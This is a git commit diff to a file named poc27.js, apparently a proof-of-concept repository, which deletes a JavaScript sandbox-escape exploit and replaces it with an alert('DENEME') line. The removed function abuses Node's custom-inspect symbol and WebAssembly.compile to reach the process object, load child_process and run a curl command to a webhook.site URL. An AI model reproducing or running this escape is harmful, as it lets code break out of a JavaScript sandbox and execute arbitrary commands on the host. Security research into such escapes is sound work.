f7f86929f619822a3e9667345e7265e79273396d
Sarp Dora Yonden <69794292+sarpdora23@users.noreply.github.com>
2024-09-23 12:23:08 +0300

    Update poc27.js

--- poc27.js
+++ poc27.js
@@ -1,15 +1,1 @@
-function escapeSanbox(ctx, req, res) {
-    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
-
-    obj = {
-    [customInspectSymbol]: (depth, opt, inspect) => {
-        inspect.constructor('return process')().mainModule.require('child_process').execSync('curl https://webhook.site/e4c4d30e-841b-43ee-8b63-8749c0066779');
-    },
-    valueOf: undefined,
-    constructor: undefined,
-}
-
-WebAssembly.compile(obj).catch(()=>{});
-}
-
-module.exports = escapeSanbox;
+alert("DENEME")
